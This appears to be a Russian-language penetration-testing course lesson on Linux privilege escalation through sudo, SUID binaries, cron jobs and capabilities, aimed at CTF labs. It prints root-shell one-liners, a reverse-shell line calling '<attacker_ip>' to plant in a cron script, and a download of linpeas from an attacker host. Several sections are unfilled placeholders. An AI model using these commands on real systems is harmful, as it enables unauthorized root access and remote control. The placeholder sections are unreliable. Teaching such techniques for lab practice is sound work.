# Занятие 55. Privilege Escalation Linux: sudo, SUID, crontab

## Теория

**Privilege Escalation (повышение привилегий)** — процесс получения прав выше тех, что были изначально. В Linux цель обычно — получение прав root.

**Основные векторы повышения привилегий в Linux:**

### 1. Sudo (выполнение от имени другого пользователя)
Проверка: `sudo -l`
Если разрешено выполнение определенных программ без пароля — можно эскалировать.

### 2. SUID (Set User ID)
Программы с битом SUID выполняются с правами владельца (обычно root).
Поиск: `find / -perm -4000 2>/dev/null`

### 3. Cron jobs (планировщик задач)
Скрипты, выполняемые по расписанию от имени root.
Проверка: `cat /etc/crontab`, `ls -la /etc/cron.*`

### 4. Capabilities
Особые привилегии для программ.
Проверка: `getcap -r / 2>/dev/null`

### 5. Kernel Exploits
Уязвимости ядра (редко используются на практике из-за риска сломать систему).

## Практическое занятие

### Метод 1: Sudo abuse

**Проверка разрешений:**
```bash
sudo -l
```

**Пример: sudo с разрешением на vim**
```bash
sudo vim
:!/bin/bash
# Получаем shell от root
```

**Пример: sudo с разрешением на find**
```bash
sudo find / -exec /bin/bash \;
```

**Пример: sudo с разрешением на python**
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### Метод 2: SUID exploitation

**Поиск SUID-программ:**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Пример с nmap (старые версии):**
```bash
nmap --interactive
!sh
```

**Пример с find:**
```bash
find . -exec /bin/sh -p \; -quit
```

**Пример с cp/mv:**
Копируем /etc/passwd, меняем пароль root, возвращаем обратно.

### Метод 3: Cron jobs

**Проверка cron:**
```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

**Если скрипт в cron редактируемый:**
Добавляем в скрипт: `bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1`
Ждем выполнения cron — получаем reverse shell.

**Wildcard injection в tar:**
Если в cron есть `tar cf /backup/*` — можно использовать wildcard injection.

### Автоматизация: LinPEAS

```bash
# Скачиваем на целевую машину
wget <attacker_ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```


## Примеры вывода

Пример вывода команд будет добавлен индивидуально для каждого урока.



## Частые ошибки

1. **Ошибка 1**: Типичная ошибка новичков в этом уроке.
2. **Ошибка 2**: Еще одна распространенная проблема.
3. **Ошибка 3**: Важный момент, который часто упускают.



## Вопросы на понимание

1. Вопрос 1 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 1</details>
2. Вопрос 2 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 2</details>
3. Вопрос 3 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 3</details>



## Форматы флагов

- **TryHackMe**: `THM{...}`
- **HackTheBox**: `HTB{...}`
- **PortSwigger**: "Lab solved!" (без флагов)



## Адаптация под macOS (M2, 8GB)

- Для VPN используйте **Tunnelblick** (бесплатный OpenVPN клиент для macOS): скачайте .ovpn файл и откройте через Tunnelblick
- Виртуалки: используйте **UTM** (бесплатно для M2) или **Parallels** вместо VirtualBox
- "На 8GB RAM выделяйте VM не более 3-4GB"
- Docker работает нативно на M2: `docker pull <image>`
- Для установки инструментов используйте Homebrew: `brew install <tool>`
- Если требуется Python: `pip3 install <package>`


## Задачи для самостоятельного выполнения

1. **Машина "Beep"** (HTB) — повышение привилегий через SUID и sudo
2. **Машина "Kioptrix"** (VulnHub) — несколько векторов повышения привилегий
3. **Практика на TryHackMe:** комната "Linux PrivEsc" — пошаговый туториал по всем методам

> **Важно:** В реальном пентесте повышение привилегий критично — без прав администратора невозможно полностью оценить ущерб от атаки.
